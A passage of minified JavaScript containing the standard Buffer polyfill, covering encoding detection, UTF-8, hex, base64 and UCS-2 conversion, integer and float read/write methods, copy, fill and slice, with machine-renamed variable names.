        if ("string" == typeof yK && "" !== yK || (yK = "utf8"), !K.isEncoding(yK)) throw new TypeError('"encoding" must be a valid string encoding');
        var yr = 0 | y2(yt, yK), yw = (yM = Z(yM, yr)).write(yt, yK);
        return yw !== yr && (yM = yM.slice(0, yw)), yM;
      }(yz, yO, yE) : function (yM, yt) {
        if (K.isBuffer(yt)) {
          var yK = 0 | y1(yt.length);
          return 0 === (yM = Z(yM, yK)).length || yt.copy(yM, 0, 0, yK), yM;
        }
        if (yt) {
          if ("undefined" != typeof ArrayBuffer && yt.buffer instanceof ArrayBuffer || "length" in yt) return "number" != typeof yt.length || function (yr) {
            return yr != yr;
          }(yt.length) ? Z(yM, 0) : y0(yM, yt);
          if ("Buffer" === yt.type && N(yt.data)) return y0(yM, yt.data);
        }
        throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.");
      }(yz, yO);
    }
    function Q(yz) {
      if ("number" != typeof yz) throw new TypeError('"size" argument must be a number');
      if (yz < 0) throw new RangeError('"size" argument must not be negative');
    }
    function W(yz, yO) {
      if (Q(yO), yz = Z(yz, yO < 0 ? 0 : 0 | y1(yO)), !K.TYPED_ARRAY_SUPPORT) for (var yE = 0; yE < yO; ++yE) yz[yE] = 0;
      return yz;
    }
    function y0(yz, yO) {
      var yE = yO.length < 0 ? 0 : 0 | y1(yO.length);
      yz = Z(yz, yE);
      for (var yI = 0; yI < yE; yI += 1) yz[yI] = 255 & yO[yI];
      return yz;
    }
    function y1(yz) {
      if (yz >= X()) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + X().toString(16) + " bytes");
      return 0 | yz;
    }
    function y2(yz, yO) {
      if (K.isBuffer(yz)) return yz.length;
      if ("undefined" != typeof ArrayBuffer && "function" == typeof ArrayBuffer.isView && (ArrayBuffer.isView(yz) || yz instanceof ArrayBuffer)) return yz.byteLength;
      "string" != typeof yz && (yz = "" + yz);
      var yE = yz.length;
      if (0 === yE) return 0;
      for (var yI = !1;;) switch (yO) {
        case "ascii":
        case "latin1":
        case "binary":
          return yE;
        case "utf8":
        case "utf-8":
        case void 0:
          return yX(yz).length;
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return 2 * yE;
        case "hex":
          return yE >>> 1;
        case "base64":
          return yF(yz).length;
        default:
          if (yI) return yX(yz).length;
          yO = ("" + yO).toLowerCase(), yI = !0;
      }
    }
    function y3(yz, yO, yE) {
      var yI = yz[yO];
      yz[yO] = yz[yE], yz[yE] = yI;
    }
    function y4(yz, yO, yE, yI, yM) {
      if (0 === yz.length) return -1;
      if ("string" == typeof yE ? (yI = yE, yE = 0) : yE > 2147483647 ? yE = 2147483647 : yE < -2147483648 && (yE = -2147483648), yE = +yE, isNaN(yE) && (yE = yM ? 0 : yz.length - 1), yE < 0 && (yE = yz.length + yE), yE >= yz.length) {
        if (yM) return -1;
        yE = yz.length - 1;
      } else if (yE < 0) {
        if (!yM) return -1;
        yE = 0;
      }
      if ("string" == typeof yO && (yO = K.from(yO, yI)), K.isBuffer(yO)) return 0 === yO.length ? -1 : y5(yz, yO, yE, yI, yM);
      if ("number" == typeof yO) return yO &= 255, K.TYPED_ARRAY_SUPPORT && "function" == typeof Uint8Array.prototype.indexOf ? yM ? Uint8Array.prototype.indexOf.call(yz, yO, yE) : Uint8Array.prototype.lastIndexOf.call(yz, yO, yE) : y5(yz, [yO], yE, yI, yM);
      throw new TypeError("val must be string, number or Buffer");
    }
    function y5(yz, yO, yE, yI, yM) {
      var yt, yK = 1, yr = yz.length, yw = yO.length;
      if (void 0 !== yI && ("ucs2" === (yI = String(yI).toLowerCase()) || "ucs-2" === yI || "utf16le" === yI || "utf-16le" === yI)) {
        if (yz.length < 2 || yO.length < 2) return -1;
        yK = 2, yr /= 2, yw /= 2, yE /= 2;
      }
      function yR(yf, yA) {
        return 1 === yK ? yf[yA] : yf.readUInt16BE(yA * yK);
      }
      if (yM) {
        var yv = -1;
        for (yt = yE; yt < yr; yt++) if (yR(yz, yt) === yR(yO, -1 === yv ? 0 : yt - yv)) {
          if (-1 === yv && (yv = yt), yt - yv + 1 === yw) return yv * yK;
        } else -1 !== yv && (yt -= yt - yv), yv = -1;
      } else for (yE + yw > yr && (yE = yr - yw), yt = yE; yt >= 0; yt--) {
        for (var ye = !0, yS = 0; yS < yw; yS++) if (yR(yz, yt + yS) !== yR(yO, yS)) {
          ye = !1;
          break;
        }
        if (ye) return yt;
      }
      return -1;
    }
    function y6(yz, yO, yE, yI) {
      yE = Number(yE) || 0;
      var yM = yz.length - yE;
      yI ? (yI = Number(yI)) > yM && (yI = yM) : yI = yM;
      var yt = yO.length;
      if (yt % 2 != 0) throw new TypeError("Invalid hex string");
      yI > yt / 2 && (yI = yt / 2);
      for (var yK = 0; yK < yI; ++yK) {
        var yr = parseInt(yO.substr(2 * yK, 2), 16);
        if (isNaN(yr)) return yK;
        yz[yE + yK] = yr;
      }
      return yK;
    }
    function y7(yz, yO, yE, yI) {
      return yZ(yX(yO, yz.length - yE), yz, yE, yI);
    }
    function y8(yz, yO, yE, yI) {
      return yZ(function (yM) {
        for (var yt = [], yK = 0; yK < yM.length; ++yK) yt.push(255 & yM.charCodeAt(yK));
        return yt;
      }(yO), yz, yE, yI);
    }
    function y9(yz, yO, yE, yI) {
      return y8(yz, yO, yE, yI);
    }
    function yy(yz, yO, yE, yI) {
      return yZ(yF(yO), yz, yE, yI);
    }
    function yV(yz, yO, yE, yI) {
      return yZ(function (yM, yt) {
        for (var yK, yr, yw, yR = [], yv = 0; yv < yM.length && !((yt -= 2) < 0); ++yv) yr = (yK = yM.charCodeAt(yv)) >> 8, yw = yK % 256, yR.push(yw), yR.push(yr);
        return yR;
      }(yO, yz.length - yE), yz, yE, yI);
    }
    function yd(yz, yO, yE) {
      return 0 === yO && yE === yz.length ? G.fromByteArray(yz) : G.fromByteArray(yz.slice(yO, yE));
    }
    function yJ(yz, yO, yE) {
      yE = Math.min(yz.length, yE);
      for (var yI = [], yM = yO; yM < yE;) {
        var yt, yK, yr, yw, yR = yz[yM], yv = null, ye = yR > 239 ? 4 : yR > 223 ? 3 : yR > 191 ? 2 : 1;
        if (yM + ye <= yE) switch (ye) {
          case 1:
            yR < 128 && (yv = yR);
            break;
          case 2:
            128 == (192 & (yt = yz[yM + 1])) && (yw = (31 & yR) << 6 | 63 & yt) > 127 && (yv = yw);
            break;
          case 3:
            yt = yz[yM + 1], yK = yz[yM + 2], 128 == (192 & yt) && 128 == (192 & yK) && (yw = (15 & yR) << 12 | (63 & yt) << 6 | 63 & yK) > 2047 && (yw < 55296 || yw > 57343) && (yv = yw);
            break;
          case 4:
            yt = yz[yM + 1], yK = yz[yM + 2], yr = yz[yM + 3], 128 == (192 & yt) && 128 == (192 & yK) && 128 == (192 & yr) && (yw = (15 & yR) << 18 | (63 & yt) << 12 | (63 & yK) << 6 | 63 & yr) > 65535 && yw < 1114112 && (yv = yw);
        }
        null === yv ? (yv = 65533, ye = 1) : yv > 65535 && (yv -= 65536, yI.push(yv >>> 10 & 1023 | 55296), yv = 56320 | 1023 & yv), yI.push(yv), yM += ye;
      }
      return function (yS) {
        var yf = yS.length;
        if (yf <= yT) return String.fromCharCode.apply(String, yS);
        for (var yA = "", yY = 0; yY < yf;) yA += String.fromCharCode.apply(String, yS.slice(yY, yY += yT));
        return yA;
      }(yI);
    }
    V.Buffer = K, V.SlowBuffer = function (yz) {
      return +yz != yz && (yz = 0), K.alloc(+yz);
    }, V.INSPECT_MAX_BYTES = 50, K.TYPED_ARRAY_SUPPORT = void 0 !== J.TYPED_ARRAY_SUPPORT ? J.TYPED_ARRAY_SUPPORT : function () {
      try {
        var yz = new Uint8Array(1);
        return yz.__proto__ = {__proto__: Uint8Array.prototype, foo: function () {
          return 42;
        }}, 42 === yz.foo() && "function" == typeof yz.subarray && 0 === yz.subarray(1, 1).byteLength;
      } catch (yO) {
        return !1;
      }
    }(), V.kMaxLength = X(), K.poolSize = 8192, K._augment = function (yz) {
      return yz.__proto__ = K.prototype, yz;
    }, K.from = function (yz, yO, yE) {
      return Y(null, yz, yO, yE);
    }, K.TYPED_ARRAY_SUPPORT && (K.prototype.__proto__ = Uint8Array.prototype, K.__proto__ = Uint8Array, "undefined" != typeof Symbol && Symbol.species && K[Symbol.species] === K && Object.defineProperty(K, Symbol.species, {value: null, configurable: !0})), K.alloc = function (yz, yO, yE) {
      return function (yI, yM, yt, yK) {
        return Q(yM), yM <= 0 ? Z(yI, yM) : void 0 !== yt ? "string" == typeof yK ? Z(yI, yM).fill(yt, yK) : Z(yI, yM).fill(yt) : Z(yI, yM);
      }(null, yz, yO, yE);
    }, K.allocUnsafe = function (yz) {
      return W(null, yz);
    }, K.allocUnsafeSlow = function (yz) {
      return W(null, yz);
    }, K.isBuffer = function (yz) {
      return !(null == yz || !yz._isBuffer);
    }, K.compare = function (yz, yO) {
      if (!K.isBuffer(yz) || !K.isBuffer(yO)) throw new TypeError("Arguments must be Buffers");
      if (yz === yO) return 0;
      for (var yE = yz.length, yI = yO.length, yM = 0, yt = Math.min(yE, yI); yM < yt; ++yM) if (yz[yM] !== yO[yM]) {
        yE = yz[yM], yI = yO[yM];
        break;
      }
      return yE < yI ? -1 : yI < yE ? 1 : 0;
    }, K.isEncoding = function (yz) {
      switch (String(yz).toLowerCase()) {
        case "hex":
        case "utf8":
        case "utf-8":
        case "ascii":
        case "latin1":
        case "binary":
        case "base64":
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return !0;
        default:
          return !1;
      }
    }, K.concat = function (yz, yO) {
      if (!N(yz)) throw new TypeError('"list" argument must be an Array of Buffers');
      if (0 === yz.length) return K.alloc(0);
      var yE;
      if (void 0 === yO) for (yO = 0, yE = 0; yE < yz.length; ++yE) yO += yz[yE].length;
      var yI = K.allocUnsafe(yO), yM = 0;
      for (yE = 0; yE < yz.length; ++yE) {
        var yt = yz[yE];
        if (!K.isBuffer(yt)) throw new TypeError('"list" argument must be an Array of Buffers');
        yt.copy(yI, yM), yM += yt.length;
      }
      return yI;
    }, K.byteLength = y2, K.prototype._isBuffer = !0, K.prototype.swap16 = function () {
      var yz = this.length;
      if (yz % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
      for (var yO = 0; yO < yz; yO += 2) y3(this, yO, yO + 1);
      return this;
    }, K.prototype.swap32 = function () {
      var yz = this.length;
      if (yz % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
      for (var yO = 0; yO < yz; yO += 4) y3(this, yO, yO + 3), y3(this, yO + 1, yO + 2);
      return this;
    }, K.prototype.swap64 = function () {
      var yz = this.length;
      if (yz % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
      for (var yO = 0; yO < yz; yO += 8) y3(this, yO, yO + 7), y3(this, yO + 1, yO + 6), y3(this, yO + 2, yO + 5), y3(this, yO + 3, yO + 4);
      return this;
    }, K.prototype.toString = function () {
      var yz = 0 | this.length;
      return 0 === yz ? "" : 0 === arguments.length ? yJ(this, 0, yz) : function (yO, yE, yI) {
        var yM = !1;
        if ((void 0 === yE || yE < 0) && (yE = 0), yE > this.length) return "";
        if ((void 0 === yI || yI > this.length) && (yI = this.length), yI <= 0) return "";
        if ((yI >>>= 0) <= (yE >>>= 0)) return "";
        for (yO || (yO = "utf8");;) switch (yO) {
          case "hex":
            return ys(this, yE, yI);
          case "utf8":
          case "utf-8":
            return yJ(this, yE, yI);
          case "ascii":
            return yc(this, yE, yI);
          case "latin1":
          case "binary":
            return yL(this, yE, yI);
          case "base64":
            return yd(this, yE, yI);
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return yp(this, yE, yI);
          default:
            if (yM) throw new TypeError("Unknown encoding: " + yO);
            yO = (yO + "").toLowerCase(), yM = !0;
        }
      }.apply(this, arguments);
    }, K.prototype.equals = function (yz) {
      if (!K.isBuffer(yz)) throw new TypeError("Argument must be a Buffer");
      return this === yz || 0 === K.compare(this, yz);
    }, K.prototype.inspect = function () {
      var yz = "", yO = V.INSPECT_MAX_BYTES;
      return this.length > 0 && (yz = this.toString("hex", 0, yO).match(/.{2}/g).join(" "), this.length > yO && (yz += " ... ")), "<Buffer " + yz + ">";
    }, K.prototype.compare = function (yz, yO, yE, yI, yM) {
      if (!K.isBuffer(yz)) throw new TypeError("Argument must be a Buffer");
      if (void 0 === yO && (yO = 0), void 0 === yE && (yE = yz ? yz.length : 0), void 0 === yI && (yI = 0), void 0 === yM && (yM = this.length), yO < 0 || yE > yz.length || yI < 0 || yM > this.length) throw new RangeError("out of range index");
      if (yI >= yM && yO >= yE) return 0;
      if (yI >= yM) return -1;
      if (yO >= yE) return 1;
      if (this === yz) return 0;
      for (var yt = (yM >>>= 0) - (yI >>>= 0), yK = (yE >>>= 0) - (yO >>>= 0), yr = Math.min(yt, yK), yw = this.slice(yI, yM), yR = yz.slice(yO, yE), yv = 0; yv < yr; ++yv) if (yw[yv] !== yR[yv]) {
        yt = yw[yv], yK = yR[yv];
        break;
      }
      return yt < yK ? -1 : yK < yt ? 1 : 0;
    }, K.prototype.includes = function (yz, yO, yE) {
      return -1 !== this.indexOf(yz, yO, yE);
    }, K.prototype.indexOf = function (yz, yO, yE) {
      return y4(this, yz, yO, yE, !0);
    }, K.prototype.lastIndexOf = function (yz, yO, yE) {
      return y4(this, yz, yO, yE, !1);
    }, K.prototype.write = function (yz, yO, yE, yI) {
      if (void 0 === yO) yI = "utf8", yE = this.length, yO = 0; else if (void 0 === yE && "string" == typeof yO) yI = yO, yE = this.length, yO = 0; else {
        if (!isFinite(yO)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
        yO |= 0, isFinite(yE) ? (yE |= 0, void 0 === yI && (yI = "utf8")) : (yI = yE, yE = void 0);
      }
      var yM = this.length - yO;
      if ((void 0 === yE || yE > yM) && (yE = yM), yz.length > 0 && (yE < 0 || yO < 0) || yO > this.length) throw new RangeError("Attempt to write outside buffer bounds");
      yI || (yI = "utf8");
      for (var yt = !1;;) switch (yI) {
        case "hex":
          return y6(this, yz, yO, yE);
        case "utf8":
        case "utf-8":
          return y7(this, yz, yO, yE);
        case "ascii":
          return y8(this, yz, yO, yE);
        case "latin1":
        case "binary":
          return y9(this, yz, yO, yE);
        case "base64":
          return yy(this, yz, yO, yE);
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return yV(this, yz, yO, yE);
        default:
          if (yt) throw new TypeError("Unknown encoding: " + yI);
          yI = ("" + yI).toLowerCase(), yt = !0;
      }
    }, K.prototype.toJSON = function () {
      return {type: "Buffer", data: Array.prototype.slice.call(this._arr || this, 0)};
    };
    var yT = 4096;
    function yc(yz, yO, yE) {
      var yI = "";
      yE = Math.min(yz.length, yE);
      for (var yM = yO; yM < yE; ++yM) yI += String.fromCharCode(127 & yz[yM]);
      return yI;
    }
    function yL(yz, yO, yE) {
      var yI = "";
      yE = Math.min(yz.length, yE);
      for (var yM = yO; yM < yE; ++yM) yI += String.fromCharCode(yz[yM]);
      return yI;
    }
    function ys(yz, yO, yE) {
      var yI = yz.length;
      (!yO || yO < 0) && (yO = 0), (!yE || yE < 0 || yE > yI) && (yE = yI);
      for (var yM = "", yt = yO; yt < yE; ++yt) yM += yh(yz[yt]);
      return yM;
    }
    function yp(yz, yO, yE) {
      for (var yI = yz.slice(yO, yE), yM = "", yt = 0; yt < yI.length; yt += 2) yM += String.fromCharCode(yI[yt] + 256 * yI[yt + 1]);
      return yM;
    }
    function yU(yz, yO, yE) {
      if (yz % 1 != 0 || yz < 0) throw new RangeError("offset is not uint");
      if (yz + yO > yE) throw new RangeError("Trying to access beyond buffer length");
    }
    function yn(yz, yO, yE, yI, yM, yt) {
      if (!K.isBuffer(yz)) throw new TypeError('"buffer" argument must be a Buffer instance');
      if (yO > yM || yO < yt) throw new RangeError('"value" argument is out of bounds');
      if (yE + yI > yz.length) throw new RangeError("Index out of range");
    }
    function yG(yz, yO, yE, yI) {
      yO < 0 && (yO = 65535 + yO + 1);
      for (var yM = 0, yt = Math.min(yz.length - yE, 2); yM < yt; ++yM) yz[yE + yM] = (yO & 255 << 8 * (yI ? yM : 1 - yM)) >>> 8 * (yI ? yM : 1 - yM);
    }
    function yq(yz, yO, yE, yI) {
      yO < 0 && (yO = 4294967295 + yO + 1);
      for (var yM = 0, yt = Math.min(yz.length - yE, 4); yM < yt; ++yM) yz[yE + yM] = yO >>> 8 * (yI ? yM : 3 - yM) & 255;
    }
    function yP(yz, yO, yE, yI, yM, yt) {
      if (yE + yI > yz.length) throw new RangeError("Index out of range");
      if (yE < 0) throw new RangeError("Index out of range");
    }
    function yg(yz, yO, yE, yI, yM) {
      return yM || yP(yz, 0, yE, 4), q.write(yz, yO, yE, yI, 23, 4), yE + 4;
    }
    function yH(yz, yO, yE, yI, yM) {
      return yM || yP(yz, 0, yE, 8), q.write(yz, yO, yE, yI, 52, 8), yE + 8;
    }
    K.prototype.slice = function (yz, yO) {
      var yE, yI = this.length;
      if ((yz = ~~yz) < 0 ? (yz += yI) < 0 && (yz = 0) : yz > yI && (yz = yI), (yO = void 0 === yO ? yI : ~~yO) < 0 ? (yO += yI) < 0 && (yO = 0) : yO > yI && (yO = yI), yO < yz && (yO = yz), K.TYPED_ARRAY_SUPPORT) (yE = this.subarray(yz, yO)).__proto__ = K.prototype; else {
        var yM = yO - yz;
        yE = new K(yM, void 0);
        for (var yt = 0; yt < yM; ++yt) yE[yt] = this[yt + yz];
      }
      return yE;
    }, K.prototype.readUIntLE = function (yz, yO, yE) {
      yz |= 0, yO |= 0, yE || yU(yz, yO, this.length);
      for (var yI = this[yz], yM = 1, yt = 0; ++yt < yO && (yM *= 256);) yI += this[yz + yt] * yM;
      return yI;
    }, K.prototype.readUIntBE = function (yz, yO, yE) {
      yz |= 0, yO |= 0, yE || yU(yz, yO, this.length);
      for (var yI = this[yz + --yO], yM = 1; yO > 0 && (yM *= 256);) yI += this[yz + --yO] * yM;
      return yI;
    }, K.prototype.readUInt8 = function (yz, yO) {
      return yO || yU(yz, 1, this.length), this[yz];
    }, K.prototype.readUInt16LE = function (yz, yO) {
      return yO || yU(yz, 2, this.length), this[yz] | this[yz + 1] << 8;
    }, K.prototype.readUInt16BE = function (yz, yO) {
      return yO || yU(yz, 2, this.length), this[yz] << 8 | this[yz + 1];
    }, K.prototype.readUInt32LE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), (this[yz] | this[yz + 1] << 8 | this[yz + 2] << 16) + 16777216 * this[yz + 3];
    }, K.prototype.readUInt32BE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), 16777216 * this[yz] + (this[yz + 1] << 16 | this[yz + 2] << 8 | this[yz + 3]);
    }, K.prototype.readIntLE = function (yz, yO, yE) {
      yz |= 0, yO |= 0, yE || yU(yz, yO, this.length);
      for (var yI = this[yz], yM = 1, yt = 0; ++yt < yO && (yM *= 256);) yI += this[yz + yt] * yM;
      return yI >= (yM *= 128) && (yI -= Math.pow(2, 8 * yO)), yI;
    }, K.prototype.readIntBE = function (yz, yO, yE) {
      yz |= 0, yO |= 0, yE || yU(yz, yO, this.length);
      for (var yI = yO, yM = 1, yt = this[yz + --yI]; yI > 0 && (yM *= 256);) yt += this[yz + --yI] * yM;
      return yt >= (yM *= 128) && (yt -= Math.pow(2, 8 * yO)), yt;
    }, K.prototype.readInt8 = function (yz, yO) {
      return yO || yU(yz, 1, this.length), 128 & this[yz] ? -1 * (255 - this[yz] + 1) : this[yz];
    }, K.prototype.readInt16LE = function (yz, yO) {
      yO || yU(yz, 2, this.length);
      var yE = this[yz] | this[yz + 1] << 8;
      return 32768 & yE ? 4294901760 | yE : yE;
    }, K.prototype.readInt16BE = function (yz, yO) {
      yO || yU(yz, 2, this.length);
      var yE = this[yz + 1] | this[yz] << 8;
      return 32768 & yE ? 4294901760 | yE : yE;
    }, K.prototype.readInt32LE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), this[yz] | this[yz + 1] << 8 | this[yz + 2] << 16 | this[yz + 3] << 24;
    }, K.prototype.readInt32BE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), this[yz] << 24 | this[yz + 1] << 16 | this[yz + 2] << 8 | this[yz + 3];
    }, K.prototype.readFloatLE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), q.read(this, yz, !0, 23, 4);
    }, K.prototype.readFloatBE = function (yz, yO) {
      return yO || yU(yz, 4, this.length), q.read(this, yz, !1, 23, 4);
    }, K.prototype.readDoubleLE = function (yz, yO) {
      return yO || yU(yz, 8, this.length), q.read(this, yz, !0, 52, 8);
    }, K.prototype.readDoubleBE = function (yz, yO) {
      return yO || yU(yz, 8, this.length), q.read(this, yz, !1, 52, 8);
    }, K.prototype.writeUIntLE = function (yz, yO, yE, yI) {
      yz = +yz, yO |= 0, yE |= 0, yI || yn(this, yz, yO, yE, Math.pow(2, 8 * yE) - 1, 0);
      var yM = 1, yt = 0;
      for (this[yO] = 255 & yz; ++yt < yE && (yM *= 256);) this[yO + yt] = yz / yM & 255;
      return yO + yE;
    }, K.prototype.writeUIntBE = function (yz, yO, yE, yI) {
      yz = +yz, yO |= 0, yE |= 0, yI || yn(this, yz, yO, yE, Math.pow(2, 8 * yE) - 1, 0);
      var yM = yE - 1, yt = 1;
      for (this[yO + yM] = 255 & yz; --yM >= 0 && (yt *= 256);) this[yO + yM] = yz / yt & 255;
      return yO + yE;
    }, K.prototype.writeUInt8 = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 1, 255, 0), K.TYPED_ARRAY_SUPPORT || (yz = Math.floor(yz)), this[yO] = 255 & yz, yO + 1;
    }, K.prototype.writeUInt16LE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 2, 65535, 0), K.TYPED_ARRAY_SUPPORT ? (this[yO] = 255 & yz, this[yO + 1] = yz >>> 8) : yG(this, yz, yO, !0), yO + 2;
    }, K.prototype.writeUInt16BE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 2, 65535, 0), K.TYPED_ARRAY_SUPPORT ? (this[yO] = yz >>> 8, this[yO + 1] = 255 & yz) : yG(this, yz, yO, !1), yO + 2;
    }, K.prototype.writeUInt32LE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 4, 4294967295, 0), K.TYPED_ARRAY_SUPPORT ? (this[yO + 3] = yz >>> 24, this[yO + 2] = yz >>> 16, this[yO + 1] = yz >>> 8, this[yO] = 255 & yz) : yq(this, yz, yO, !0), yO + 4;
    }, K.prototype.writeUInt32BE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 4, 4294967295, 0), K.TYPED_ARRAY_SUPPORT ? (this[yO] = yz >>> 24, this[yO + 1] = yz >>> 16, this[yO + 2] = yz >>> 8, this[yO + 3] = 255 & yz) : yq(this, yz, yO, !1), yO + 4;
    }, K.prototype.writeIntLE = function (yz, yO, yE, yI) {
      if (yz = +yz, yO |= 0, !yI) {
        var yM = Math.pow(2, 8 * yE - 1);
        yn(this, yz, yO, yE, yM - 1, -yM);
      }
      var yt = 0, yK = 1, yr = 0;
      for (this[yO] = 255 & yz; ++yt < yE && (yK *= 256);) yz < 0 && 0 === yr && 0 !== this[yO + yt - 1] && (yr = 1), this[yO + yt] = (yz / yK >> 0) - yr & 255;
      return yO + yE;
    }, K.prototype.writeIntBE = function (yz, yO, yE, yI) {
      if (yz = +yz, yO |= 0, !yI) {
        var yM = Math.pow(2, 8 * yE - 1);
        yn(this, yz, yO, yE, yM - 1, -yM);
      }
      var yt = yE - 1, yK = 1, yr = 0;
      for (this[yO + yt] = 255 & yz; --yt >= 0 && (yK *= 256);) yz < 0 && 0 === yr && 0 !== this[yO + yt + 1] && (yr = 1), this[yO + yt] = (yz / yK >> 0) - yr & 255;
      return yO + yE;
    }, K.prototype.writeInt8 = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 1, 127, -128), K.TYPED_ARRAY_SUPPORT || (yz = Math.floor(yz)), yz < 0 && (yz = 255 + yz + 1), this[yO] = 255 & yz, yO + 1;
    }, K.prototype.writeInt16LE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 2, 32767, -32768), K.TYPED_ARRAY_SUPPORT ? (this[yO] = 255 & yz, this[yO + 1] = yz >>> 8) : yG(this, yz, yO, !0), yO + 2;
    }, K.prototype.writeInt16BE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 2, 32767, -32768), K.TYPED_ARRAY_SUPPORT ? (this[yO] = yz >>> 8, this[yO + 1] = 255 & yz) : yG(this, yz, yO, !1), yO + 2;
    }, K.prototype.writeInt32LE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 4, 2147483647, -2147483648), K.TYPED_ARRAY_SUPPORT ? (this[yO] = 255 & yz, this[yO + 1] = yz >>> 8, this[yO + 2] = yz >>> 16, this[yO + 3] = yz >>> 24) : yq(this, yz, yO, !0), yO + 4;
    }, K.prototype.writeInt32BE = function (yz, yO, yE) {
      return yz = +yz, yO |= 0, yE || yn(this, yz, yO, 4, 2147483647, -2147483648), yz < 0 && (yz = 4294967295 + yz + 1), K.TYPED_ARRAY_SUPPORT ? (this[yO] = yz >>> 24, this[yO + 1] = yz >>> 16, this[yO + 2] = yz >>> 8, this[yO + 3] = 255 & yz) : yq(this, yz, yO, !1), yO + 4;
    }, K.prototype.writeFloatLE = function (yz, yO, yE) {
      return yg(this, yz, yO, !0, yE);
    }, K.prototype.writeFloatBE = function (yz, yO, yE) {
      return yg(this, yz, yO, !1, yE);
    }, K.prototype.writeDoubleLE = function (yz, yO, yE) {
      return yH(this, yz, yO, !0, yE);
    }, K.prototype.writeDoubleBE = function (yz, yO, yE) {
      return yH(this, yz, yO, !1, yE);
    }, K.prototype.copy = function (yz, yO, yE, yI) {
      if (yE || (yE = 0), yI || 0 === yI || (yI = this.length), yO >= yz.length && (yO = yz.length), yO || (yO = 0), yI > 0 && yI < yE && (yI = yE), yI === yE) return 0;
      if (0 === yz.length || 0 === this.length) return 0;
      if (yO < 0) throw new RangeError("targetStart out of bounds");
      if (yE < 0 || yE >= this.length) throw new RangeError("sourceStart out of bounds");
      if (yI < 0) throw new RangeError("sourceEnd out of bounds");
      yI > this.length && (yI = this.length), yz.length - yO < yI - yE && (yI = yz.length - yO + yE);
      var yM, yt = yI - yE;
      if (this === yz && yE < yO && yO < yI) for (yM = yt - 1; yM >= 0; --yM) yz[yM + yO] = this[yM + yE]; else if (yt < 1e3 || !K.TYPED_ARRAY_SUPPORT) for (yM = 0; yM < yt; ++yM) yz[yM + yO] = this[yM + yE]; else Uint8Array.prototype.set.call(yz, this.subarray(yE, yE + yt), yO);
      return yt;
    }, K.prototype.fill = function (yz, yO, yE, yI) {
      if ("string" == typeof yz) {
        if ("string" == typeof yO ? (yI = yO, yO = 0, yE = this.length) : "string" == typeof yE && (yI = yE, yE = this.length), 1 === yz.length) {
          var yM = yz.charCodeAt(0);
          yM < 256 && (yz = yM);
        }
        if (void 0 !== yI && "string" != typeof yI) throw new TypeError("encoding must be a string");
        if ("string" == typeof yI && !K.isEncoding(yI)) throw new TypeError("Unknown encoding: " + yI);
      } else "number" == typeof yz && (yz &= 255);
      if (yO < 0 || this.length < yO || this.length < yE) throw new RangeError("Out of range index");
      if (yE <= yO) return this;
      var yt;
      if (yO >>>= 0, yE = void 0 === yE ? this.length : yE >>> 0, yz || (yz = 0), "number" == typeof yz) for (yt = yO; yt < yE; ++yt) this[yt] = yz; else {
        var yK = K.isBuffer(yz) ? yz : yX(new K(yz, yI).toString()), yr = yK.length;
        for (yt = 0; yt < yE - yO; ++yt) this[yt + yO] = yK[yt % yr];
      }
      return this;
    };
    var yN = /[^+\/0-9A-Za-z-_]/g;
    function yh(yz) {
      return yz < 16 ? "0" + yz.toString(16) : yz.toString(16);
    }
    function yX(yz, yO) {
      var yE;
      yO = yO || 1 / 0;
      for (var yI = yz.length, yM = null, yt = [], yK = 0; yK < yI; ++yK) {
        if ((yE = yz.charCodeAt(yK)) > 55295 && yE < 57344) {
          if (!yM) {
            if (yE > 56319) {
              (yO -= 3) > -1 && yt.push(239, 191, 189);
              continue;
            }
            if (yK + 1 === yI) {
              (yO -= 3) > -1 && yt.push(239, 191, 189);
              continue;
            }
            yM = yE;
            continue;
          }
          if (yE < 56320) {
            (yO -= 3) > -1 && yt.push(239, 191, 189), yM = yE;
            continue;
          }
          yE = 65536 + (yM - 55296 << 10 | yE - 56320);
        } else yM && (yO -= 3) > -1 && yt.push(239, 191, 189);
        if (yM = null, yE < 128) {
          if ((yO -= 1) < 0) break;
          yt.push(yE);
        } else if (yE < 2048) {
          if ((yO -= 2) < 0) break;
          yt.push(yE >> 6 | 192, 63 & yE | 128);
        } else if (yE < 65536) {
          if ((yO -= 3) < 0) break;
          yt.push(yE >> 12 | 224, yE >> 6 & 63 | 128, 63 & yE | 128);
        } else {
          if (!(yE < 1114112)) throw new Error("Invalid code point");
          if ((yO -= 4) < 0) break;
          yt.push(yE >> 18 | 240, yE >> 12 & 63 | 128, yE >> 6 & 63 | 128, 63 & yE | 128);
        }
      }
      return yt;
    }
    function yF(yz) {
      return G.toByteArray(function (yO) {
        if ((yO = function (yE) {
          return yE.trim ? yE.trim() : yE.replace(/^\s+|\s+$/g, "");
        }(yO).replace(yN, "")).length < 2) return "";
        for (; yO.length % 4 != 0;) yO += "=";
        return yO;
      }(yz));
    }
    function yZ(yz, yO, yE, yI) {
